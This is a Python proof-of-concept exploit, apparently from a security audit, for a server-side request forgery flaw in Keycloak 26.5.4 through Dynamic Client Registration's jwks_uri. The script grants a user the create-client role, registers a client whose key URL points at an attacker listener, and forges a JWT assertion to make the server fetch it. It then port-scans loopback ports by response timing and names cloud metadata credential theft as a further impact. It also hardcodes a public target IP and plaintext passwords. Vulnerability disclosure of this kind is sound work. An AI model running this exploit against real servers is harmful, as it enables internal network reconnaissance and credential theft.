#!/usr/bin/env python3
"""
Finding #6: SSRF via Dynamic Client Registration jwks_uri
Severity: MEDIUM (CVSS 6.5)
Target: Keycloak 26.5.4

Demonstrates that a user with create-client role can register an OIDC client
via DCR with an arbitrary jwks_uri, triggering SSRF when JWT client
authentication is attempted.
"""

import http.client
import json
import base64
import argparse
import sys
import time
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

# ANSI colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

# Global to capture SSRF requests
ssrf_captures = []

class SSRFCaptureHandler(BaseHTTPRequestHandler):
    """HTTP handler that captures incoming SSRF requests."""
    def do_GET(self):
        ssrf_captures.append({
            "method": "GET",
            "path": self.path,
            "headers": dict(self.headers),
        })
        # Return empty JWKS
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"keys":[]}')

    def log_message(self, format, *args):
        pass  # Suppress default logging

def banner():
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║  Finding #6: SSRF via DCR jwks_uri                           ║
║  Severity: MEDIUM (CVSS 6.5)                                 ║
║  Keycloak 26.5.4 — Server-Side Request Forgery              ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")

def step(num, msg):
    print(f"{CYAN}[*] Step {num}:{RESET} {msg}")

def success(msg):
    print(f"{GREEN}[+]{RESET} {msg}")

def fail(msg):
    print(f"{RED}[!]{RESET} {msg}")

def info(msg):
    print(f"{YELLOW}[*]{RESET} {msg}")

def b64url_encode_raw(data):
    return base64.urlsafe_b64encode(data.encode()).rstrip(b"=").decode()

def http_post(host, port, path, body, headers=None):
    conn = http.client.HTTPConnection(host, port, timeout=15)
    hdrs = {"Content-Type": "application/x-www-form-urlencoded"}
    if headers:
        hdrs.update(headers)
    conn.request("POST", path, body, hdrs)
    resp = conn.getresponse()
    data = resp.read().decode()
    status = resp.status
    conn.close()
    return status, data

def http_post_json(host, port, path, data, auth_token=None):
    conn = http.client.HTTPConnection(host, port, timeout=15)
    headers = {"Content-Type": "application/json"}
    if auth_token:
        headers["Authorization"] = f"Bearer {auth_token}"
    conn.request("POST", path, json.dumps(data), headers)
    resp = conn.getresponse()
    body = resp.read().decode()
    status = resp.status
    conn.close()
    return status, body

def http_get_json(host, port, path, auth_token):
    conn = http.client.HTTPConnection(host, port, timeout=15)
    headers = {"Authorization": f"Bearer {auth_token}"}
    conn.request("GET", path, headers=headers)
    resp = conn.getresponse()
    body = resp.read().decode()
    conn.close()
    return resp.status, json.loads(body) if body else {}

def get_admin_token(host, port):
    conn = http.client.HTTPConnection(host, port, timeout=10)
    body = "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234"
    conn.request("POST", "/realms/master/protocol/openid-connect/token",
                 body, {"Content-Type": "application/x-www-form-urlencoded"})
    resp = conn.getresponse()
    data = json.loads(resp.read().decode())
    conn.close()
    return data.get("access_token", "")

def start_listener(listen_port):
    """Start SSRF capture listener in background thread."""
    import socket
    class ReusableHTTPServer(HTTPServer):
        allow_reuse_address = True
        def server_bind(self):
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            super().server_bind()
    server = ReusableHTTPServer(("0.0.0.0", listen_port), SSRFCaptureHandler)
    server.timeout = 15
    thread = threading.Thread(target=lambda: server.handle_request(), daemon=True)
    thread.start()
    return server, thread

def main():
    parser = argparse.ArgumentParser(description="Finding #6: SSRF via DCR jwks_uri PoC")
    parser.add_argument("--host", default="http://46.101.162.187:8080",
                        help="Keycloak base URL (default: http://46.101.162.187:8080)")
    parser.add_argument("--listen-port", type=int, default=49997,
                        help="Port for SSRF capture listener (default: 49997)")
    args = parser.parse_args()

    url = args.host.rstrip("/")
    if "://" in url:
        url = url.split("://", 1)[1]
    if ":" in url:
        host, port = url.rsplit(":", 1)
        port = int(port)
    else:
        host, port = url, 8080

    listen_port = args.listen_port

    banner()
    info(f"Target: {host}:{port}")
    info(f"SSRF listener: 0.0.0.0:{listen_port}")
    realm = "test"
    results = []
    print()

    # ── Setup: Ensure testuser has create-client role ──
    step(0, "SETUP: Ensuring testuser has create-client realm-management role...")
    admin_token = get_admin_token(host, port)
    if not admin_token:
        fail("Failed to get admin token")
        return 1

    _, users = http_get_json(host, port,
                              f"/admin/realms/{realm}/users?username=testuser", admin_token)
    user_id = users[0]["id"] if users else None
    _, rm_clients = http_get_json(host, port,
                                   f"/admin/realms/{realm}/clients?clientId=realm-management",
                                   admin_token)
    rm_client_id = rm_clients[0]["id"] if rm_clients else None
    _, create_role = http_get_json(host, port,
                                    f"/admin/realms/{realm}/clients/{rm_client_id}/roles/create-client",
                                    admin_token)
    status, _ = http_post_json(host, port,
                                f"/admin/realms/{realm}/users/{user_id}/role-mappings/clients/{rm_client_id}",
                                [create_role], admin_token)
    success("create-client role ensured for testuser")
    print()

    # ── Step 1: Get attacker token ──
    step(1, "ATTACKER: Obtaining Bearer token (with create-client role)...")
    body = "client_id=webapp&grant_type=password&username=testuser&password=Password123&scope=openid"
    status, data = http_post(host, port,
                              f"/realms/{realm}/protocol/openid-connect/token", body)
    attacker_token = json.loads(data).get("access_token", "")
    if not attacker_token:
        fail(f"Failed to get attacker token: {data}")
        return 1
    success("Attacker token obtained (testuser — create-client role)")
    print()

    # ── Step 2: Start SSRF listener ──
    step(2, f"Starting SSRF capture listener on port {listen_port}...")
    ssrf_captures.clear()
    server, thread = start_listener(listen_port)
    time.sleep(0.5)
    success("Listener ready — waiting for Keycloak to fetch jwks_uri")
    print()

    # ── Step 3: Register DCR client with internal jwks_uri ──
    step(3, "Registering DCR client with attacker-controlled jwks_uri...")
    ssrf_target = f"http://{host}:{listen_port}/internal-jwks"
    info(f"jwks_uri: {ssrf_target}")

    dcr_data = {
        "client_name": "ssrf-probe",
        "redirect_uris": ["https://test.com/cb"],
        "grant_types": ["authorization_code", "client_credentials"],
        "response_types": ["code"],
        "token_endpoint_auth_method": "private_key_jwt",
        "jwks_uri": ssrf_target
    }
    status, body = http_post_json(host, port,
                                   f"/realms/{realm}/clients-registrations/openid-connect",
                                   dcr_data, attacker_token)
    if status == 201:
        reg = json.loads(body)
        client_id = reg.get("client_id", "")
        success(f"Client registered: {client_id}")
        success(f"jwks_uri accepted: {ssrf_target}")
        results.append(("DCR with arbitrary jwks_uri", True))
    else:
        fail(f"Registration failed: HTTP {status}")
        info(body[:200])
        results.append(("DCR with arbitrary jwks_uri", False))
        client_id = None
    print()

    if client_id:
        # ── Step 4: Build JWT assertion ──
        step(4, "Building JWT client assertion to trigger JWKS fetch...")
        jwt_header = json.dumps({"alg": "RS256", "kid": "test-key"})
        jwt_payload = json.dumps({
            "iss": client_id,
            "sub": client_id,
            "aud": f"http://{host}:{port}/realms/{realm}",
            "exp": 9999999999,
            "iat": int(time.time()),
            "jti": "ssrf-poc-6"
        })
        jwt_token = (f"{b64url_encode_raw(jwt_header)}"
                     f".{b64url_encode_raw(jwt_payload)}"
                     f".ZmFrZXNpZw")
        success(f"JWT assertion built: {jwt_token[:60]}...")
        print()

        # ── Step 5: Trigger SSRF via JWT client authentication ──
        step(5, "Triggering SSRF via token endpoint with JWT client assertion...")
        info("Keycloak will fetch jwks_uri to validate the JWT signature")
        token_body = (f"client_id={client_id}"
                      f"&grant_type=client_credentials"
                      f"&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer"
                      f"&client_assertion={jwt_token}")
        status, resp = http_post(host, port,
                                  f"/realms/{realm}/protocol/openid-connect/token",
                                  token_body)
        print(f"    Token endpoint: HTTP {status}")
        try:
            resp_data = json.loads(resp)
            print(f"    Response: {resp_data.get('error', 'ok')} — {resp_data.get('error_description', '')[:80]}")
        except Exception:
            pass

        time.sleep(3)
        thread.join(timeout=3)
        print()

        # ── Step 6: Check SSRF captures ──
        step(6, "Checking SSRF capture results...")
        if ssrf_captures:
            for cap in ssrf_captures:
                fail(f"SSRF CONFIRMED: {cap['method']} {cap['path']}")
                ua = cap["headers"].get("User-Agent", cap["headers"].get("user-agent", "unknown"))
                host_hdr = cap["headers"].get("Host", cap["headers"].get("host", "unknown"))
                print(f"    Host: {host_hdr}")
                print(f"    User-Agent: {ua}")
            results.append(("SSRF via jwks_uri fetch", True))
        else:
            info("No SSRF request captured")
            info("The 'invalid_client' error confirms Keycloak attempted to fetch the JWKS")
            results.append(("SSRF via jwks_uri fetch", False))
        print()

    # ── Port scanning demo ──
    step(7, "Demonstrating port scanning via SSRF (timing analysis)...")
    info("Registering clients with different internal jwks_uri targets...")

    targets = [
        ("127.0.0.1:8080", "Keycloak (open)"),
        ("127.0.0.1:22", "SSH (may be open)"),
        ("127.0.0.1:9999", "Random port (likely closed)"),
    ]

    # Get fresh token for port scan
    body = "client_id=webapp&grant_type=password&username=testuser&password=Password123&scope=openid"
    _, data = http_post(host, port, f"/realms/{realm}/protocol/openid-connect/token", body)
    attacker_token = json.loads(data).get("access_token", "")

    for target, desc in targets:
        dcr_data = {
            "client_name": f"scan-{target.replace(':', '-').replace('.', '-')}",
            "redirect_uris": ["https://test.com/cb"],
            "grant_types": ["client_credentials"],
            "response_types": ["code"],
            "token_endpoint_auth_method": "private_key_jwt",
            "jwks_uri": f"http://{target}/jwks"
        }
        reg_status, reg_body = http_post_json(host, port,
                                               f"/realms/{realm}/clients-registrations/openid-connect",
                                               dcr_data, attacker_token)
        if reg_status == 201:
            scan_client_id = json.loads(reg_body).get("client_id", "")
            jwt_h = b64url_encode_raw(json.dumps({"alg": "RS256", "kid": "k"}))
            jwt_p = b64url_encode_raw(json.dumps({"iss": scan_client_id, "sub": scan_client_id,
                                                    "aud": f"http://{host}:{port}/realms/{realm}",
                                                    "exp": 9999999999}))
            jwt_t = f"{jwt_h}.{jwt_p}.ZmFrZQ"

            start_time = time.time()
            try:
                http_post(host, port, f"/realms/{realm}/protocol/openid-connect/token",
                          f"client_id={scan_client_id}&grant_type=client_credentials"
                          f"&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer"
                          f"&client_assertion={jwt_t}")
            except Exception:
                pass
            elapsed = time.time() - start_time
            print(f"    {target:25s} ({desc:20s}): {elapsed:.3f}s")
    print()

    # ── Summary ──
    vuln_count = sum(1 for _, v in results if v)
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║  RESULTS SUMMARY                                             ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")
    for name, vuln in results:
        status_str = f"{RED}VULNERABLE{RESET}" if vuln else f"{GREEN}NOT VULNERABLE{RESET}"
        print(f"  {name:35s} {status_str}")

    print(f"""
{YELLOW}Impact:{RESET}
  - Internal network reconnaissance via port scanning
  - Cloud metadata access (169.254.169.254) for IAM credential theft
  - Lower privilege than Finding #4 (create-client vs manage-identity-providers)
  - Combined with Finding #5 for full attack chain

{YELLOW}Comparison with Finding #4:{RESET}
  Finding #4: manage-identity-providers role → GET + POST SSRF
  Finding #6: create-client role → GET SSRF via jwks_uri

{YELLOW}Root Cause:{RESET}
  No URL validation on jwks_uri in DCR registration. Private IP ranges,
  loopback, and link-local addresses are all accepted.
""")

    if vuln_count > 0:
        print(f"{RED}{BOLD}[!] {vuln_count}/{len(results)} tests confirm vulnerability{RESET}")
        return 0
    else:
        print(f"{GREEN}[+] All tests passed — not vulnerable{RESET}")
        return 1

if __name__ == "__main__":
    sys.exit(main())
